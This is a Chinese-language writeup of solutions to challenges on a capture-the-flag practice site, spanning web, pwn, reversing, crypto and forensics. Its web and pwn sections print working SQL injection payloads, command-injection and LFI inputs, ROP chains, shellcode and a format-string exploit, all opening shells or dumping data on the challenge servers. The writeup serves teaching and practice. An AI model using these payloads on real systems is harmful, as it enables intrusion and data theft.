# HackMe Writeup

# Misc
## 1 flag
摁... flag就已經在那邊了

## 2 corgi can fly
用Stegsolve開起來後切到Red plane 0後掃QR code

## 3 television
用strings搜尋就出來了

## 14 zipfile
題目給了一個十分難搞的zip檔，可以先用以下的code來做初步的解壓縮
```python=
while True:
    zf = zipfile.ZipFile('./zip/zipfile.zip', 'r')
    zf.extractall()
    zf.close()
    os.remove('./zip/zipfile.zip')
    os.replace("./zipfile.zip", "./zip/zipfile.zip")
```
最後會以例外來強制解除執行，因為接下來的zip檔要使用別種方式來做處理

接下來可以使用以下程式碼來解出隱藏在壓縮檔中的文字
```python=
target_zip_file = zipfile.ZipFile('./zip/zipfile.zip', 'r')
flag = ''

# because the dir in the zip file contain with 8 bit 2 binary number
for i in range(256):
    # 0 -> 00000000
    target_name = bin(i)[2:].zfill(8)
    # 01010101 -> 0/1/0/1/0/1/0/1
    target_name = '/'.join(target_name)

    #print(target_name)
    print('[', end='')
    little_flag = []
    for info in target_zip_file.infolist():
        if target_name != info.filename[-18:-3]:
            continue

        # read 0/1/0/1/0/1/0/1PK and create temp file
        data = target_zip_file.read(info)
        f = open('./temp', 'wb')
        f.write(data)
        f.close()

        target = './temp'
        # unzip the first zip
        zfile = zipfile.ZipFile(target, 'r')
        # print(zfile.namelist())    # file name like 'Î¨ä·¼ºÔ½¤\x8bÒ±ÂÄ\x87\x9fÄ\x9c\x90'
        for filename in zfile.namelist():
            d = zfile.read(filename)
            f2 = open('./temp2', 'wb')
            f2.write(d)
            f2.close()

        # second zip
        zfile = zipfile.ZipFile('./temp2', 'r')
        d = []
        dd = []
        for info_ in zfile.infolist():
            d.append(zfile.read(info_))

        #print(d)
        for j in range(len(d)):
            dd.append([])
            for k in range(len(d[j])):
                dd[j].append(d[j][k])
        #print(dd)

        s = []
        for j in range(len(dd[0])):
            t = 0
            for k in range(len(dd)):
                t = t ^ d[k][j]

            s.append(t)
        for j in range(len(s)):
            print(chr(s[j]), end='')
        print(',', end='')

    print(']')
```

從輸出中可以觀察到第二列的文字具有意義，將輸出複製至檔案中還原出flag
```python=
f = open('./zip/output.txt', 'r')
data = f.readlines()
f.close()
#print(data)
for i in range(len(data)):
    data[i] = data[i][1:-2]
    s = data[i].split(',')
    print(s[1], end='')
```

reference:[hackme.inndy.tw Misc zipfile Writeup](https://l1b0.github.io/126054f9/)

# Web
## 15 hide and seek
F12看原始碼

## 16 guestbook
載sqlmap之後先隨便送個post出去，然後從message list看到剛剛的post後觀察網址有注入點的可能性，丟到sqlmap 去跑

python sqlmap.py -u "https://ctf.hackme.quest/gb/?mod=read&id=85" --batch --dbs

查資料庫料表

python sqlmap.py -u "https://ctf.hackme.quest/gb/?mod=read&id=85" --batch --tables -D g8

指定g8資料庫後查table表

python sqlmap.py -u "https://ctf.hackme.quest/gb/?mod=read&id=85" --batch --dump flag -D g8

顯示資料，然後就有flag了

## 17 LFI
用php://filter/來讀檔案
一開始先用

https://ctf.hackme.quest/lfi/?page=php://filter//read=convert.base64-encode/resource=pages/flag

base64解碼後得到:"Can you read the flag<?php require('config.php'); ?>?"
再用

https://ctf.hackme.quest/lfi/?page=php://filter//read=convert.base64-encode/resource=pages/config

讀，base64解碼後就是flag了

## 18 homepage
按F12打開主控台掃描QR code

## 19 ping
反引號"\`"沒有在黑名單裡，可以利用這個來執行想要執行的其他指令
先嘗試\`ls\`後得到有flag.php檔案
再用\`sort \?\?\?\?\?\?\?\?\`得出內容

## 20 scoreboard
F12後換到網路，打開scoreboard的標頭，可以發現flag藏在x-flag裡

## 21 login as admin 0
要使用sql injection來做登入的動作，可以先看一下網頁原始碼
``` php=
function safe_filter($str)
{
    $strl = strtolower($str);
    if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') ||
        strstr($strl, 'update') || strstr($strl, 'delete')
    ) {
        return '';
    }
    return str_replace("'", "\\'", $str);
}

$_POST = array_map(safe_filter, $_POST);
```

他會把常使用到的 or 1=1給擋掉， 因此可把恆正表示改為 or 2=2

除此之外，他也會把" ' "給替換為" \\\\' "，此處可改為輸入" \\' "來繞開這個檢測

嘗試輸入 "\\' or 2=2#"，結果發現依舊是以guest身分登入

加上 order by user嘗試改變return的資料順序後就發現是以admin登入了

## 22 login as admin 0.1
和上一題是同樣的網站，但是要找到藏在資料庫裡的flag

找到query的列數與會回顯的列

```admin\' union select 1,2,3,4 #```

發現2會回顯

找到資料庫的名稱為"login_as_admin0"

```admin\' union select 1,(SELECT database()),3,4 #```

找到table的名稱為"h1dden_f14g"

```admin\' union select 1,group_concat(TABLE_NAME),3,4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="login_as_admin0"#```


找到column的名稱 "the_f14g"

```admin\' union select 1,group_concat(COLUMN_NAME),3,4 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="h1dden_f14g"#```

找到flag~~

```admin\' union select 1,group_concat(the_f14g),3,4 FROM h1dden_f14g#```

## 23 login as admin 1
要以isadmin為True的狀態登入，然後此題的空白字元會被限制，可以使用\"/\*\*/\"來繞過。

可輸入"admin\\'or\/\*\*\/isadmin#"來進行登入

## 24 login as admin 1.2
先使用 order by確定查詢的column數"aaa\\'/\*\*/or/\*\*/isadmin/\*\*/order/\*\*/by/\*\*/4#"

然後isadmin位於第四個欄位，所以接著於第四個使用boolean injection來爆出table name
```python=
import requests
table = ''
query = r"aaa\'/**/union/**/select/**/1,2,3,ascii(substr(group_concat(table_name),{},1))={}/**/from/**/information_schema.tables/**/where/**/table_schema=database()#"

for pos in range(50):
    for char in range(32, 127):
        post = {"name": query.format(pos, char), "password": "123"}
        ret = requests.post("https://ctf.hackme.quest/login1/", post).text

        if "You are admin!" in ret:
            table += chr(char)
            print(chr(char), end='')
            break
print(table)
# 0bdb54c98123f5526ccaed982d2006a9,users
```

接下來來爆出column name
```python=
query = r'aaa\'/**/union/**/select/**/1,2,3,ascii(substr(group_concat(column_name),{},1))={}/**/from/**/information_schema.columns/**/where/**/table_name="0bdb54c98123f5526ccaed982d2006a9"#'
#4a391a11cfa831ca740cf8d00782f3a6,id
```

最後爆出flag
```python=
query = r'aaa\'/**/union/**/select/**/1,2,3,ascii(substr(group_concat(4a391a11cfa831ca740cf8d00782f3a6),{},1))={}/**/from/**/0bdb54c98123f5526ccaed982d2006a9#'
```


## 25 login as admin 3
這題使用到了php的weak comparison。

當php進行下列比較時會return ture
```php=
"php" == true;
```

因此將cookie中的admin資料改為true，sig的資料也改為true後，伺服端進行比對時便會return true。

## 26 login as admin 4
可使用curl來繞過header的Redirect
```cmd=
curl -d "name=admin" https://ctf.hackme.quest/login4/
```

或者可以使用python的request並disallow掉redirect
```python=
import requests

url = 'https://ctf.hackme.quest/login4/'
post = {'name': 'admin'}
ret = requests.post(url, post, allow_redirects=False)
print(ret.text)
```

## 27 login as admin 6
在使用extract($data)時，原有的變數內容會被data中的資料所覆蓋。
因此將表單中hidden標籤中的內容修改如下便可。
```htmlembedded=
<input type="hidden" name="data" id="data" value='{"username":"admin","password":"123", "users":{"admin": "123", "guest": "guest"}}'>
```

{"username":"admin","password":"123", "users":{"admin": "123", "guest": "guest"}}

## 28 login as admin 7
如果0e開頭的字串與"000000"...進行弱比較時會視為相等，因此只要找到經過md5後開頭為0e的字串便可。

可參考下方之值
```
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s1885207154a
0e509367213418206700842008763514
s1502113478a
0e861580163291561247404381396064
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s155964671a
0e342768416822451524974117254469

```

## 29 login as admin 8
先以guest/guest登入後觀察login8cookie 和 login8sha512 cookie，其中login8cookie是以url encoded，解碼後將is_admin改為1並做sha512修改cookie。

由於%00 null byte的問題，直接進行複製有可能會出錯，可以至[SHA512](https://emn178.github.io/online-tools/sha512.html)開啟dev tool並使用sha512(decodeURIComponent(cookie))

## 30 login as admin 8.1
請參考此[網站](https://blog.maple3142.net/2020/07/23/hackme-ctf-experience-and-hints/#login-as-admin-8.1)

## 31 dafuq-manager 1
進去之後先以guest/guest登入，接著有個"see-me-if-you-need-tips.txt"的文件告訴我們要創建一個key為help，value為me的cookie。

創建並重新載入後他便問你是否會修改cookie，此時會發現cookie中有一個show hidden的cookie，把value改為yes就可以了。

## 32 dafuq-manager 2
在edit file的地方發現他直接將檔案位置已get參數傳遞，嘗試將參數改為".\./.\./.config/.htusers.php"就可以看到user的帳號及密碼。

不過密碼是被md5雜湊過的，這裡可以使用[CrackStation](https://crackstation.net/)這個工具來還原

## 33 dafuq-manager 3
這題他告訴你要使用到shell，在程式碼中找了一下發現"debug.php"中有"exec"的相關字眼，所以應該是要從這邊來開始進行。

一開始先將首頁的action改為debug後進入debug頁面

接著修改"dir"參數來避開"You are not hacky enough :("錯誤，可使用dir[]=0

接著最後就是要輸入指令了，但是exec在黑名單中，不過php可藉由字串來呼叫函式，因此可使用下列指令
```php=
$command = '$a = "ex"; $b = "ec"; $c = $a.$b; echo $c("cd /var/www/webhdisk/flag3/ && ./meow ./flag3");';
```
下一步是要知道他加密所使用的key，但這不困難，可以在.config裡的conf.php中找到

最後可以編寫出以下的script
```php=
<?php
$command = '$a = "ex"; $b = "ec"; $c = $a.$b; echo $c("cd /var/www/webhdisk/flag3/ && ./meow ./flag3");';
$secret_key = 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3';
$hmac = hash_hmac('sha256', $command, $secret_key);
$url='https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&dir[]=1&command='.urlencode(base64_encode($command) . ".".$hmac).'<br/>';
echo $url;
?>
```


# Reversing
## 41 helloworld
打開程式之後要輸入一串正確的數字，反編譯過後發現程式會將輸入與12B9B0A1進行比較，把他轉為十進位後輸入就可以了。

![](https://i.imgur.com/vHCCIAq.png)

## 42 simple
這一題可以先注意到有個UIJT.JT.ZPVS.GMBH的字串

![](https://i.imgur.com/36kwK2J.png)

點進去之後題目還很貼心的提示你有沒有聽過凱薩加密

![](https://i.imgur.com/3j7XaQY.png)

拿去解密後也就差不多做完了

不過也是可以認真來看一下反組譯過後的程式碼

![](https://i.imgur.com/rqoSeQy.png)

首先這個區塊將使用者的輸入放入了var_4C的變數，為了後續閱讀方便，我將他重新命名為input

![](https://i.imgur.com/8uFsqUE.png)

接著下面區塊是在比較當前index的輸入是否為'\0'，var_C可視作為for迴圈中的i

![](https://i.imgur.com/T8j7jUt.png)

此部分在比較當前index的輸入是否為換行(對應的ascii碼為0Ah)

![](https://i.imgur.com/ojK4e19.png)

如果比較結果不相等，則將當前index的輸入+1後放入到var_8C變數字串中，後續將此變數命名為decoded_string

![](https://i.imgur.com/n2bpKXs.png)

如果相等(表示為換行)，則將該位置填為'\0'

![](https://i.imgur.com/9WTEVFX.png)


將i加1

![](https://i.imgur.com/0oxVnvc.png)


將整個輸入字串處理完後會將decoded_string與aUijtJtZpvsGmbh做比較，此處呼叫_strcmp進行比較，比較的回傳值會放置於eax

![](https://i.imgur.com/Bdm3fB9.png)

最後，若兩字串相等便print出flag，否則print出Try hard.

## 43 passthis
一開始使用ida反編譯時找不到main函式，改使用r2後成功找到main函式位於0x00402760的位置

![](https://i.imgur.com/CVmEzqD.png)

切回到ida並找到對應位置後，前面有一長串沒用的程式碼...，可以直接略過從"Let me check your flag:"的地方開始看

下面的code看過之後發現程式會對下面變數的位置做xor，點進去之後將資料複製做xor，flag就會出現了

![](https://i.imgur.com/n7RjnYl.png)


```python=
data = [0xc1, 0xcb, 0xc6, 0xc0, 0xfc, 0xc9, 0xe8, 0xab, 0xa7, 0xde, 0xe8, 0xf2, 0xa7, 0xf4, 0xef, 0xe8, 0xf2, 0xeb,
        0xe3, 0xa7, 0xe9, 0xe8, 0xf3, 0xa7, 0xf7, 0xe6, 0xf4, 0xf4, 0xa7, 0xf3, 0xef, 0xe2, 0xa7, 0xe1, 0xeb, 0xe6,
        0xe0, 0xfa]

for i in range(len(data)):
    print(chr(data[i] ^ 0x87), end='')

```

## 44 pyyy
從題目一開始下載下來的是.pyc檔，先將其反編譯為.py檔
```
pip install uncompyle6
uncompyle6 -o pyyy.py pyyy.pyc
```
藉由以上指令可得到.py檔，不過反編譯出來的程式碼是python 2的版本，需要略為修改才能正常執行。

執行程式時會因為遞迴次數過多導致終止，觀察後可以發現元凶在這一個部分
```python=
lambda f: lambda x: 1 if x < 2 else f(x - 1) * x % n
```
分析此部分後，可以發現其實這就只是一個計算階乘的功用，修改寫法後，再將後面輸入的地方註解掉就可以了
```python=
l = (lambda f: (lambda x: x(x))(lambda y: f(lambda *args: y(y)(*args))))(
        lambda f: lambda x: math.factorial(x) % n)(g % 27777)
```

## 45 accumulator
程式在比對flag時，會先將一個變數中的值加到比對的文字中，比對完畢後，再將此加總過後的值儲存回該變數中。

因此只需要將儲存的資料值，一一將後面減去前面，得到差值，即可得到flag





# Pwn
## 57 catflag
就直接連上去就好了
```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7709)
    r.interactive()
```

## 58 homework
從原始碼可以看出這個地方允許使用者修改任意位置的值

![image alt](https://i.imgur.com/3GEpGpV.png")

可以從這個地方修改return address value到call_me_maybe來開啟shell
先使用r2來查call_me_maybe address的位置

![image alt](https://i.imgur.com/NJZ0IGv.png")

查出了是0x080485fb 轉成十進位後為134514171
下一步就是要計算好offset來讓程式修改到正確的位置
陣列的大小為10個int也就是40byte，換算為16進位後為0x28

![image alt](https://i.imgur.com/lTtaYxK.png")

從變數宣告處0x34扣掉0xc後即為0x28得出陣列位於0x34的位置
接著便可來計算offset
0x34再加上saved rbp的0x4後除4為14即為offset
```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7701)
    r.recvuntil(b'name? ')
    r.sendline(b'haha')
    r.recvuntil(b'numbers\n')
    r.recvuntil(b'> ')
    r.sendline(b'1')
    r.recvuntil(b'edit: ')
    r.sendline(b'14')
    r.recvuntil(b'many? ')
    r.sendline(b'134514171')
    r.recvuntil(b'numbers\n')
    r.recvuntil(b'> ')
    r.sendline(b'0')
    r.interactive()
```

## 59 ROP
checksec 一下後發現沒有開啟Canary和PIE，程式又有用gets來做讀取
所以可以直接buffer overflow掉reutrn address
但比較麻煩的是程式裡面沒有直接提供shell的function，所以得自己搞
這時候就要用到ROP的技術，簡單來說就是一直在程式裡面跳來跳去
先下這個指令
```
ROPgadget --binary ./ROP --ropchain
```
然後ROP chain就建好了 Yaaa
接著只需要算個offset就好，讓他可以剛好從return address開始寫
變數的長度為0xc再加上4之後為0x10
```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7704)

    # Padding goes here
    p = b'a' * 0x10

    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea060)  # @ .data
    p += pack('<I', 0x080b8016)  # pop eax ; ret
    p += b'/bin'
    p += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea064)  # @ .data + 4
    p += pack('<I', 0x080b8016)  # pop eax ; ret
    p += b'//sh'
    p += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea068)  # @ .data + 8
    p += pack('<I', 0x080492d3)  # xor eax, eax ; ret
    p += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080481c9)  # pop ebx ; ret
    p += pack('<I', 0x080ea060)  # @ .data
    p += pack('<I', 0x080de769)  # pop ecx ; ret
    p += pack('<I', 0x080ea068)  # @ .data + 8
    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea068)  # @ .data + 8
    p += pack('<I', 0x080492d3)  # xor eax, eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0806c943)  # int 0x80
    r.sendline(p)

    r.interactive()
```
## 60 ROP2
真正的ROP，沒辦法直接用ROPgadget來生成ROP chain了
先觀察一下後發現在overflow函式中有呼叫3號的syscall

[查表](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)後可發現是對應到read函式，又應沒有開啟Canary所以可以從這邊overflow
陣列長度為0xc因此padding長度為0xc+0x4=0x10
接下來就要來開始寫ROP chain了，目標為11號system call -> execve，然後再來呼叫/bin/sh來開啟shell


然後為了要寫上/bin/sh，我們自己需要再呼叫一次read system call來進行寫入，對應的參數為 systemcall(0x3, 0, bss_address, 0x8)
因此第一部分的ROP chain內容為


| Stack Content               |
| --------------------------- |
| system call funtion address |
| overflow funciton address   |
| 0x3                         |
| 0x0                         |
| bss_address                 |
| 0x8                         |


然後第二段就是要來呼叫execve
| Stack Content                                   |
| ----------------------------------------------- |
| system call funtion address                     |
| overflow funciton address(不過這個不重要就是了) |
| 0x11                                            |
| bss_address                                     |
| 0x0                                             |
| 0x0                                             |

```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7703)
    elf = pwn.ELF('./asset/rop2')
    bss_addr = elf.bss()
    system_call_addr = 0x08048320
    overflow_addr = 0x08048454

    p = b'a' * 0x10
    p += p32(system_call_addr) + p32(overflow_addr)
    p += p32(0x3) + p32(0x0) + p32(bss_addr) + p32(0x8)
    r.send(p)
    r.send(b'/bin/sh\x00')

    p = b'a' * 0x10
    p += p32(system_call_addr) + p32(overflow_addr)
    p += p32(0xb) + p32(bss_addr) + p32(0x0) + p32(0x0)
    r.send(p)
    r.interactive()
```

## 61 toooomuch
反編譯一下知道passcode是43210之後輸入後玩猜數字遊戲後flag就出來了

## 62 toooomuch-2
這題沒有開啟NX因此有可寫可執行的記憶體區段，可以用shell code來解
可以先從[這裡](https://www.exploit-db.com/shellcodes)挑選一個合適的shell code，然後就可以來尋找可以寫入的區段了
使用gdb的vmmap後會顯示出寫可執行的記憶體區段

![image alt](https://i.imgur.com/faGFd6E.png")

等等可以選用0x08049000到0x0804a000的位置來進行寫入
寫入時一樣先計算好padding為(0x18 + 0x4)後
接著讓程式return到gets的位置來在我們所指定的位置寫入shell code
下一個內容為gets function的return address
最後是gets function的argument也就是寫入的位置
```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7702)
    shell_code = b'\xd9\xee\x9b\xd9\x74\x24\xf4\x5f\x83\xc7\x25\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x08\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a'
    gets_addr = 0x08048480
    wx_addr = 0x08049000
    p = b'a' * (0x18 + 4)
    p += p32(0x08048480)  # return to gets function
    p += p32(0x08049000)  # gets function's return address
    p += p32(0x08049000)  # gets function's argument
    r.recvuntil(b'passcode: ')
    r.sendline(p)
    r.sendline(shell_code)
    r.interactive()
```

## 63 echo
這題的核心概念是格式化字串攻擊，藉由printf寫入相關資訊，然後開啟shell
除此之外，更用到了呼叫library函式的漏洞
當程式執行到library function時，會跳轉到對應的plt，然後plt中會檢查該函式的got是否有被填上，若有則跳轉到該位置，執行library function，若否，則填上got後再執行。

此時，got位置便若是被修改，則可跳轉到任意地址，但條件是程式不能為full relro。

這個題目的解法便是將printf的got修改為system的plt後開啟shell
```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7711)
    printf_got = 0x0804a010
    system_plt = 0x08048400

    p = p32(printf_got) + p32(printf_got + 1) + p32(printf_got + 2) + p32(printf_got + 3)
    #  00 84 04 08    system's plt
    p += b'%240c%7$hhn'  # write 0x00
    p += b'%132c%8$hhn'  # write 0x84
    p += b'%128c%9$hhn'  # write 0x04
    p += b'%4c%10$hhn'   # write 0x08
    r.sendline(p)
    r.sendline('/bin/sh\00')

    r.interactive()
```

# Crypto

## 81 easy
先把hex值轉成ascii後再做base64解碼

## 82 r u kidding
[凱薩加密](https://www.dcode.fr/caesar-cipher)

## 83 not hard
使用python中的base64套件可輕鬆解決。

觀察原始輸入，覺得可能是使用Base85編碼法，解碼後看到文字最後帶有"="符號，嘗試使用base64後得出的結果似乎不正確。

經嘗試後發現應該是要再使用base32解碼，然後flag就出來了。
```python=
import base64

data = 'Nm@rmLsBy{Nm5u-K{iZKPgPMzS2I*lPc%_SMOjQ#O;uV{MM*?PPFhk|Hd;hVPFhq{HaAH<'
data_85 = base64.b85decode(data)
print(base64.b32decode(data_85))
```

## 84 classic cipher 1
可以使用[quipqiup](https://www.quipqiup.com/)這個網站來計算出原本的訊息。

解出來後再去除空格，轉成大寫就可以了。

## 85 classic cipher 2
這題就是在考Vigenere加密法，這裡就給幾個提示然後就留給大家自己分析了

1. key的長度為51
2. 解密出來的文章前幾個字為 A CAESAR SALAD IS A SALAD OF ROMAINE

## 86 easy AES
題目一開始給了一個py檔，需要安裝pycrypto套件才能正常執行，但不知道是甚麼環境問題，我的電腦無法正常安裝此套件。因此改為安裝"pycryptodome"套件作為替代

接下來，我們需要輸入一個明文，並使用"Hello, World...!"金鑰加密後得到"Good Plain Text!"的結果。

由於AES為對稱式加密，因此先將"Good Plain Text!"以"Hello, World...!"金鑰解密後即可得到對應的明文，這邊需要注意的是此處使用的模式為"ECB"模式

```python=
c = AES.new(b'Hello, World...!', AES.MODE_ECB)
plain_text = c.decrypt(b'Good Plain Text!')
print(plain_text)
```
## 87 one time padding
題目將key為0的可能除去掉了，因此只需要重複蒐集255個加密過後不同的密文，然後找出沒有出現過的那一個，即是flag

然後在蒐集過程中發現，奇數位置的資料是沒有用的資料，因此僅蒐集分析偶數位置的資料
```python=
import requests

url = 'https://ctf.hackme.quest/otp/?issue_otp=1'

for i in range(0, 100, 2):
    table = {}
    while len(table) != 255:
        content = requests.get(url)
        data = content.text.split('\n')
        for j in range(20):
            num = data[j][i: i+2]
            table[int(num, 16)] = 1
    for j in range(256):
        if j not in table:
            print(chr(j), end='')
            break
```

## 92 xor
一開始先使用xortool來進行分析得出key為"HACKMEPLS"，從檔案中也可以看到flag的片段，但還不正確。

幾次嘗試過後發現將key轉為小寫就可以了。


# Forensic
## 98 easy pdf
轉為xml格式後ctrl F搜尋就有了

## 99 this is a pen
轉為doc格式後把第二頁的圖片解群組後，慢慢刪掉其他的圖片後就可以找到了。

